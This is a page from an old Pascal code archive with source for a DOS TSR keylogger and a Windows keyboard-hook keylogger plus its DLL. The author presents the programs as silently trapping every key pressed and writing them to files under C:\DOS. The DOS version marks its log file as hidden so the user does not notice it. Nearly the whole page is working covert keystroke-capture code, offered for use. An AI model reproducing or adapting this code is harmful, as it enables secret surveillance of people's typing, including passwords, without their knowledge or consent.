<html>
<head><title> "Trapping keys pressed to a file" by SEBASTIAN FIORENTINI</title><link rel="STYLESHEET" type="text/css" href="../swagsource.css"></head>
<body><p align="center"><b>[</b><a href="index.html">Back to KEYBOARD SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0115.PAS">Original</a><b>]</b></p><!--StartFragment--><pre><code><font color="#000000">KEYTRAP<font color="#000080">.</font>PAS  <font color="#FF0000"><b>in </b></font>TSR<font color="#000080">.</font>SWG      <font color="#800000">0008 10</font><font color="#000080">/</font><font color="#800000">13 112</font><font color="#000080">/</font><font color="#800000">219 51</font><font color="#000080">%
</font>s pressed <font color="#FF0000"><b>to </b></font>a <font color="#FF0000"><b>file</b></font><font color="#000080">}
</font><font color="#008000"><i>{
Well, these are some useful sources that you can append to
KEYBOARD.SWG.. They do a trap of all pressed key's and send them to a
file...
These are de DOS and Windows Versions...

{Keyboard Capture for DOS.
 Well, this program trap all pressed characters and send them to a
file in a very silent mode... ;-)
 Use at your own risk...}

{$M 2048,0,0}
{$F+}
</i></font><font color="#FF0000"><b>USES </b></font>DOS<font color="#000080">;
</font><font color="#FF0000"><b>CONST
 </b></font>ARCHIVO<font color="#000080">=</font><font color="#800000">'C:\DOS\KEYS.DAT'</font><font color="#000080">;</font><font color="#008000"><i>{Path and FileName of the File containing 
the Traped Key's}
 </i></font>OLDSTACKSS <font color="#000080">:  </font>WORD <font color="#000080">= </font><font color="#800000">0</font><font color="#000080">;
 </font>OLDSTACKSP <font color="#000080">:  </font>WORD <font color="#000080">= </font><font color="#800000">0</font><font color="#000080">;
 </font>STACKSW <font color="#000080">:    </font>INTEGER <font color="#000080">= - </font><font color="#800000">1</font><font color="#000080">;
 </font>OURSTACKSEG <font color="#000080">: </font>WORD <font color="#000080">= </font><font color="#800000">0</font><font color="#000080">;
 </font>OURSTACKSP  <font color="#000080">: </font>WORD <font color="#000080">= </font><font color="#800000">0</font><font color="#000080">;
</font><font color="#FF0000"><b>VAR
 </b></font>O9<font color="#000080">:</font><font color="#FF0000"><b>PROCEDURE</b></font><font color="#000080">;
 </font>R                    <font color="#000080">: </font>REGISTERS<font color="#000080">;
 </font>DOSSEG<font color="#000080">, </font>DOSBUSY              <font color="#000080">: </font>WORD<font color="#000080">;
 </font>TICK<font color="#000080">, </font>WAITBUF               <font color="#000080">: </font>INTEGER<font color="#000080">;
 </font>NEEDPOP                 <font color="#000080">: </font>BOOLEAN<font color="#000080">;
 </font>CBUF<font color="#000080">:</font>WORD<font color="#000080">;
 </font>KBUF<font color="#000080">:</font><font color="#FF0000"><b>ARRAY</b></font><font color="#000080">[</font><font color="#800000">1</font><font color="#000080">..</font><font color="#800000">255</font><font color="#000080">] </font><font color="#FF0000"><b>OF </b></font>BYTE<font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>BEGININT<font color="#000080">;
</font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$FF</font><font color="#000080">/</font><font color="#800000">$06</font><font color="#000080">/</font>STACKSW<font color="#000080">/
   </font><font color="#800000">$75</font><font color="#000080">/</font><font color="#800000">$10</font><font color="#000080">/
   </font><font color="#800000">$8C</font><font color="#000080">/</font><font color="#800000">$16</font><font color="#000080">/</font>OLDSTACKSS<font color="#000080">/
       </font><font color="#800000">$89</font><font color="#000080">/</font><font color="#800000">$26</font><font color="#000080">/</font>OLDSTACKSP<font color="#000080">/
       </font><font color="#800000">$8E</font><font color="#000080">/</font><font color="#800000">$16</font><font color="#000080">/</font>OURSTACKSEG<font color="#000080">/
       </font><font color="#800000">$8B</font><font color="#000080">/</font><font color="#800000">$26</font><font color="#000080">/</font>OURSTACKSP<font color="#000080">);
</font><font color="#FF0000"><b>PROCEDURE </b></font>ENDINT<font color="#000080">;
</font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$FF</font><font color="#000080">/</font><font color="#800000">$0E</font><font color="#000080">/</font>STACKSW<font color="#000080">/
       </font><font color="#800000">$7D</font><font color="#000080">/</font><font color="#800000">$08</font><font color="#000080">/
       </font><font color="#800000">$8E</font><font color="#000080">/</font><font color="#800000">$16</font><font color="#000080">/</font>OLDSTACKSS<font color="#000080">/
   </font><font color="#800000">$8B</font><font color="#000080">/</font><font color="#800000">$26</font><font color="#000080">/</font>OLDSTACKSP<font color="#000080">);
</font><font color="#FF0000"><b>PROCEDURE </b></font>CALLPOP<font color="#000080">(</font>SUB<font color="#000080">:</font>POINTER<font color="#000080">);
</font><font color="#FF0000"><b>BEGIN
INLINE</b></font><font color="#000080">(</font><font color="#800000">$FF</font><font color="#000080">/</font><font color="#800000">$5E</font><font color="#000080">/</font><font color="#800000">$06</font><font color="#000080">);
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>CLI<font color="#000080">; </font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$FA</font><font color="#000080">);
</font><font color="#FF0000"><b>PROCEDURE </b></font>STI<font color="#000080">; </font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$FB</font><font color="#000080">);
</font><font color="#FF0000"><b>PROCEDURE </b></font>TSRCRAP<font color="#000080">;
</font><font color="#FF0000"><b>VAR
</b></font>F<font color="#000080">:</font><font color="#FF0000"><b>FILE</b></font><font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>CLI<font color="#000080">;
 </font>BEGININT<font color="#000080">;
 </font>STI<font color="#000080">;
 </font>NEEDPOP <font color="#000080">:= </font>FALSE<font color="#000080">;
 </font><font color="#008000"><i>{}
  </i></font>ASSIGN<font color="#000080">(</font>F<font color="#000080">,</font>ARCHIVO<font color="#000080">);
  </font><font color="#008000"><i>{$I-}
  </i></font>RESET<font color="#000080">(</font>F<font color="#000080">,</font><font color="#800000">1</font><font color="#000080">);
  </font><font color="#008000"><i>{$I+}
  </i></font><font color="#FF0000"><b>IF </b></font>IORESULT<font color="#000080">&lt;&gt;</font><font color="#800000">0 </font><font color="#FF0000"><b>THEN </b></font>REWRITE<font color="#000080">(</font>F<font color="#000080">,</font><font color="#800000">1</font><font color="#000080">) </font><font color="#FF0000"><b>ELSE
                      </b></font>SEEK<font color="#000080">(</font>F<font color="#000080">,</font>FILESIZE<font color="#000080">(</font>F<font color="#000080">));
  </font>SETFATTR<font color="#000080">(</font>F<font color="#000080">,</font>ARCHIVE<font color="#000080">+</font>HIDDEN<font color="#000080">);</font><font color="#008000"><i>{LO HACE OCULTO}
  </i></font>BLOCKWRITE<font color="#000080">(</font>F<font color="#000080">,</font>KBUF<font color="#000080">,</font>CBUF<font color="#000080">);
  </font>CBUF<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
  </font>CLOSE<font color="#000080">(</font>F<font color="#000080">);
 </font><font color="#008000"><i>{}
 </i></font>TICK <font color="#000080">:= </font><font color="#800000">0</font><font color="#000080">;
 </font>CLI<font color="#000080">;
 </font>ENDINT<font color="#000080">;
 </font>STI<font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>RUNTSR<font color="#000080">; </font>INTERRUPT<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>CLI<font color="#000080">;
 </font>BEGININT<font color="#000080">;
 </font>STI<font color="#000080">;
 </font>INC<font color="#000080">(</font>TICK<font color="#000080">);
 </font><font color="#FF0000"><b>IF </b></font><font color="#000080">(</font>TICK<font color="#000080">&gt;</font><font color="#800000">18.2</font><font color="#000080">*</font>WAITBUF<font color="#000080">) </font><font color="#FF0000"><b>AND </b></font><font color="#000080">(</font>CBUF<font color="#000080">&gt;</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>THEN BEGIN
  </b></font>NEEDPOP<font color="#000080">:=</font>TRUE<font color="#000080">;
  </font><font color="#FF0000"><b>IF </b></font>MEM<font color="#000080">[</font>DOSSEG<font color="#000080">:</font>DOSBUSY<font color="#000080">] = </font><font color="#800000">0 </font><font color="#FF0000"><b>THEN BEGIN
   </b></font>NEEDPOP<font color="#000080">:=</font>FALSE<font color="#000080">;
   </font>PORT<font color="#000080">[</font><font color="#800000">$20</font><font color="#000080">]:=</font><font color="#800000">$20</font><font color="#000080">;
   </font>TSRCRAP<font color="#000080">;
  </font><font color="#FF0000"><b>END</b></font><font color="#000080">;
 </font><font color="#FF0000"><b>END</b></font><font color="#000080">;
 </font>CLI<font color="#000080">;
 </font>ENDINT<font color="#000080">;
 </font>STI<font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>INT28TSR<font color="#000080">; </font>INTERRUPT<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>CLI<font color="#000080">;
 </font>BEGININT<font color="#000080">;
 </font>STI<font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>NEEDPOP <font color="#000080">= </font>TRUE <font color="#FF0000"><b>THEN </b></font>TSRCRAP<font color="#000080">;
 </font>CLI<font color="#000080">;
 </font>ENDINT<font color="#000080">;
 </font>STI<font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>N9<font color="#000080">;</font>INTERRUPT<font color="#000080">;
</font><font color="#FF0000"><b>VAR
 </b></font>TAIL     <font color="#000080">: </font>WORD <font color="#FF0000"><b>ABSOLUTE </b></font><font color="#800000">$40 </font><font color="#000080">: </font><font color="#800000">$1C</font><font color="#000080">;
 </font>B<font color="#000080">:</font>BOOLEAN<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>B<font color="#000080">:=</font>PORT<font color="#000080">[</font><font color="#800000">$60</font><font color="#000080">]&lt;</font><font color="#800000">$80</font><font color="#000080">;
 </font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$9C</font><font color="#000080">);
 </font>O9<font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>B <font color="#FF0000"><b>AND </b></font><font color="#000080">(</font>LO<font color="#000080">(</font>MEMW<font color="#000080">[</font><font color="#800000">$40</font><font color="#000080">:</font>TAIL<font color="#000080">])&lt;&gt;</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>THEN
  BEGIN
   </b></font>INC<font color="#000080">(</font>CBUF<font color="#000080">);
   </font><font color="#FF0000"><b>IF </b></font>CBUF<font color="#000080">&gt;</font><font color="#800000">255 </font><font color="#FF0000"><b>THEN </b></font>CBUF<font color="#000080">:=</font><font color="#800000">255</font><font color="#000080">;
   </font>KBUF<font color="#000080">[</font>CBUF<font color="#000080">]:=</font>LO<font color="#000080">(</font>MEMW<font color="#000080">[</font><font color="#800000">$40</font><font color="#000080">:</font>TAIL<font color="#000080">]);
  </font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>INITTSR<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>OURSTACKSEG <font color="#000080">:= </font>SSEG<font color="#000080">;
 </font><font color="#FF0000"><b>INLINE</b></font><font color="#000080">(</font><font color="#800000">$89</font><font color="#000080">/</font><font color="#800000">$26</font><font color="#000080">/</font>OURSTACKSP<font color="#000080">);
 </font>R<font color="#000080">.</font>AH <font color="#000080">:= </font><font color="#800000">$34</font><font color="#000080">;
 </font>MSDOS<font color="#000080">(</font>R<font color="#000080">);
 </font>DOSSEG <font color="#000080">:= </font>R<font color="#000080">.</font>ES<font color="#000080">;
 </font>DOSBUSY <font color="#000080">:= </font>R<font color="#000080">.</font>BX<font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>INITTSR<font color="#000080">;
 </font>CBUF<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;</font>FILLCHAR<font color="#000080">(</font>KBUF<font color="#000080">,</font>SIZEOF<font color="#000080">(</font>KBUF<font color="#000080">),</font><font color="#800000">0</font><font color="#000080">);
 </font>WAITBUF <font color="#000080">:= </font><font color="#800000">5</font><font color="#000080">;</font><font color="#008000"><i>{Time to Wait in Second before sending pressed keys to 
the file}
 </i></font>NEEDPOP<font color="#000080">:=</font>FALSE<font color="#000080">;
 </font>TICK <font color="#000080">:= </font><font color="#800000">0</font><font color="#000080">;
 </font>GETINTVEC<font color="#000080">(</font><font color="#800000">$9</font><font color="#000080">,@</font>O9<font color="#000080">);
 </font>SETINTVEC<font color="#000080">(</font><font color="#800000">$9</font><font color="#000080">,@</font>N9<font color="#000080">);
 </font>SETINTVEC<font color="#000080">(</font><font color="#800000">$28</font><font color="#000080">,@</font>INT28TSR<font color="#000080">);
 </font>SETINTVEC<font color="#000080">(</font><font color="#800000">$1C</font><font color="#000080">,@</font>RUNTSR<font color="#000080">);
 </font>KEEP<font color="#000080">(</font><font color="#800000">0</font><font color="#000080">);
</font><font color="#FF0000"><b>END</b></font><font color="#000080">.

</font>Now<font color="#000080">, </font>this <font color="#FF0000"><b>is </b></font>the Windows Version<font color="#000080">...
</font><font color="#008000"><i>{This program has the same purposse as KCAPD.Pas, except that is for 
Windows...}
{This is KCAPW.PAS}
{$D-,L-}
</i></font><font color="#FF0000"><b>USES </b></font>WINTYPES<font color="#000080">,</font>WINPROCS<font color="#000080">,</font>OWINDOWS<font color="#000080">; 
</font><font color="#FF0000"><b>VAR
</b></font>OLDHOOK<font color="#000080">:</font>TFARPROC<font color="#000080">;
</font>KEYHOOK<font color="#000080">:</font>TFARPROC<font color="#000080">;
</font><font color="#008000"><i>{}
</i></font><font color="#FF0000"><b>PROCEDURE </b></font>SAVEKEY<font color="#000080">(</font>ARCHIVO<font color="#000080">:</font><font color="#FF0000"><b>STRING</b></font><font color="#000080">;</font>W<font color="#000080">:</font>WORD<font color="#000080">);</font><font color="#FF0000"><b>FAR</b></font><font color="#000080">;</font><font color="#FF0000"><b>EXTERNAL </b></font><font color="#800000">'KCAPWDLL' 
</font>INDEX <font color="#800000">1</font><font color="#000080">;
</font><font color="#008000"><i>{}
</i></font><font color="#FF0000"><b>FUNCTION 
</b></font>KEYBOARDCAPTURE<font color="#000080">(</font>CODE<font color="#000080">:</font>INTEGER<font color="#000080">;</font>WPARAM<font color="#000080">:</font>WORD<font color="#000080">;</font>LPARAM<font color="#000080">:</font>LONGINT<font color="#000080">):</font>LONGINT<font color="#000080">;</font><font color="#FF0000"><b>EXPORT</b></font><font color="#000080">;
</font><font color="#FF0000"><b>CONST
</b></font>ARCHIVO<font color="#000080">=</font><font color="#800000">'C:\DOS\EDIT.DAT'</font><font color="#000080">;</font><font color="#008000"><i>{EL NOMBRE Y EL PATH DEL ARCHIVO A CREAR 
CON LAS TECLAS}
</i></font><font color="#FF0000"><b>BEGIN
  IF </b></font>CODE<font color="#000080">=</font>HC_ACTION <font color="#FF0000"><b>THEN
    IF </b></font><font color="#000080">(</font>LPARAM <font color="#FF0000"><b>AND </b></font><font color="#000080">(</font><font color="#800000">1 </font><font color="#FF0000"><b>SHL </b></font><font color="#800000">31</font><font color="#000080">)&lt;&gt;</font><font color="#800000">1 </font><font color="#FF0000"><b>SHL </b></font><font color="#800000">31</font><font color="#000080">) </font><font color="#FF0000"><b>AND
       </b></font><font color="#000080">(</font>LPARAM <font color="#FF0000"><b>AND </b></font><font color="#000080">(</font><font color="#800000">1 </font><font color="#FF0000"><b>SHL </b></font><font color="#800000">30</font><font color="#000080">)&lt;&gt;</font><font color="#800000">1 </font><font color="#FF0000"><b>SHL </b></font><font color="#800000">30</font><font color="#000080">) </font><font color="#FF0000"><b>THEN 
</b></font>SAVEKEY<font color="#000080">(</font>ARCHIVO<font color="#000080">,</font>WPARAM<font color="#000080">);
  </font>KEYBOARDCAPTURE<font color="#000080">:=</font>DEFHOOKPROC<font color="#000080">(</font>CODE<font color="#000080">,</font>WPARAM<font color="#000080">,</font>LPARAM<font color="#000080">,</font>OLDHOOK<font color="#000080">);
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#008000"><i>{}
</i></font><font color="#FF0000"><b>PROCEDURE </b></font>LOOP<font color="#000080">;
</font><font color="#FF0000"><b>VAR
  </b></font>MSG<font color="#000080">:</font>TMSG<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
  WHILE </b></font>GETMESSAGE<font color="#000080">(</font>MSG<font color="#000080">,</font><font color="#800000">0</font><font color="#000080">,</font><font color="#800000">0</font><font color="#000080">,</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>DO
  BEGIN
    </b></font>TRANSLATEMESSAGE<font color="#000080">(</font>MSG<font color="#000080">);
    </font>DISPATCHMESSAGE<font color="#000080">(</font>MSG<font color="#000080">);
  </font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>VAR
</b></font>S<font color="#000080">:</font>TAPPLICATION<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>KEYHOOK<font color="#000080">:=</font>MAKEPROCINSTANCE<font color="#000080">(@</font>KEYBOARDCAPTURE<font color="#000080">,</font>HINSTANCE<font color="#000080">);
 </font>OLDHOOK<font color="#000080">:=</font>SETWINDOWSHOOK<font color="#000080">(</font>WH_KEYBOARD<font color="#000080">,</font>KEYHOOK<font color="#000080">);
 </font>LOOP<font color="#000080">;
</font><font color="#FF0000"><b>END</b></font><font color="#000080">.

</font>Now<font color="#000080">, </font>the DLL <font color="#FF0000"><b>for </b></font>KCAPW<font color="#000080">.</font>PAS
<font color="#008000"><i>{This file is KCAPWDLL.PAS}
{$C FIXED}
{$D-,L-}
</i></font><font color="#FF0000"><b>LIBRARY </b></font>CLOCKDLL<font color="#000080">;
</font><font color="#FF0000"><b>USES </b></font>WINPROCS<font color="#000080">,</font>WINTYPES<font color="#000080">,</font>WINDOS<font color="#000080">;
</font><font color="#FF0000"><b>PROCEDURE </b></font>SAVEKEY<font color="#000080">(</font>ARCHIVO<font color="#000080">:</font><font color="#FF0000"><b>STRING</b></font><font color="#000080">;</font>W<font color="#000080">:</font>WORD<font color="#000080">);</font><font color="#FF0000"><b>EXPORT</b></font><font color="#000080">;
</font><font color="#FF0000"><b>VAR
</b></font>F<font color="#000080">:</font><font color="#FF0000"><b>FILE</b></font><font color="#000080">;
</font>ST<font color="#000080">:</font><font color="#FF0000"><b>STRING</b></font><font color="#000080">;
</font>FA<font color="#000080">:</font>WORD<font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
 </b></font>ASSIGN<font color="#000080">(</font>F<font color="#000080">,</font>ARCHIVO<font color="#000080">);
 </font><font color="#008000"><i>{$I-}
 </i></font>RESET<font color="#000080">(</font>F<font color="#000080">,</font><font color="#800000">1</font><font color="#000080">);
 </font><font color="#008000"><i>{$I+}
 </i></font><font color="#FF0000"><b>IF </b></font>IORESULT<font color="#000080">&lt;&gt;</font><font color="#800000">0 </font><font color="#FF0000"><b>THEN </b></font>REWRITE<font color="#000080">(</font>F<font color="#000080">,</font><font color="#800000">1</font><font color="#000080">);
 </font>SEEK<font color="#000080">(</font>F<font color="#000080">,</font>FILESIZE<font color="#000080">(</font>F<font color="#000080">));
 </font>ST<font color="#000080">:=</font><font color="#800000">''</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_SHIFT <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Sf]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_BACK <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Bk]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_RETURN <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[En]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_SPACE <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">' '</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_MENU <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Al]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_CONTROL <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Ct]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_ESCAPE <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Ec]'</font><font color="#000080">;
 </font><font color="#FF0000"><b>IF </b></font>W<font color="#000080">=</font>VK_TAB <font color="#FF0000"><b>THEN </b></font>ST<font color="#000080">:=</font><font color="#800000">'[Tb]'</font><font color="#000080">;
 </font><font color="#008000"><i>{}
 </i></font><font color="#FF0000"><b>IF </b></font><font color="#000080">(</font>ST<font color="#000080">=</font><font color="#800000">''</font><font color="#000080">) </font><font color="#FF0000"><b>AND </b></font><font color="#000080">(</font>W<font color="#000080">&gt;=</font><font color="#800000">$30</font><font color="#000080">) </font><font color="#FF0000"><b>AND </b></font><font color="#000080">(</font>W<font color="#000080">&lt;=</font><font color="#800000">$6F</font><font color="#000080">) </font><font color="#FF0000"><b>THEN </b></font>BLOCKWRITE<font color="#000080">(</font>F<font color="#000080">,</font>W<font color="#000080">,</font><font color="#800000">1</font><font color="#000080">) </font><font color="#FF0000"><b>ELSE
 IF </b></font><font color="#000080">(</font>ST<font color="#000080">&lt;&gt;</font><font color="#800000">''</font><font color="#000080">) </font><font color="#FF0000"><b>THEN </b></font>BLOCKWRITE<font color="#000080">(</font>F<font color="#000080">,</font>ST<font color="#000080">[</font><font color="#800000">1</font><font color="#000080">],</font>LENGTH<font color="#000080">(</font>ST<font color="#000080">));
 </font><font color="#FF0000"><b>IF </b></font>ST<font color="#000080">=</font><font color="#800000">'[En]' </font><font color="#FF0000"><b>THEN BEGIN </b></font>ST<font color="#000080">:=</font><font color="#800000">#13</font><font color="#000080">;</font>BLOCKWRITE<font color="#000080">(</font>F<font color="#000080">,</font>ST<font color="#000080">[</font><font color="#800000">1</font><font color="#000080">],</font><font color="#800000">1</font><font color="#000080">);</font><font color="#FF0000"><b>END</b></font><font color="#000080">;
 </font><font color="#008000"><i>{}
 </i></font>CLOSE<font color="#000080">(</font>F<font color="#000080">);
</font><font color="#008000"><i>{ MESSAGEBEEP(0);}
</i></font><font color="#FF0000"><b>END</b></font><font color="#000080">;
</font><font color="#FF0000"><b>EXPORTS
 </b></font>SAVEKEY <font color="#FF0000"><b>INDEX </b></font><font color="#800000">1</font><font color="#000080">;
</font><font color="#FF0000"><b>BEGIN
END</b></font><font color="#000080">.
</font>
</code></pre><!--EndFragment--><p align="center"><b>[</b><a href="index.html">Back to KEYBOARD SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0115.PAS">Original</a><b>]</b></p></body>
</html>
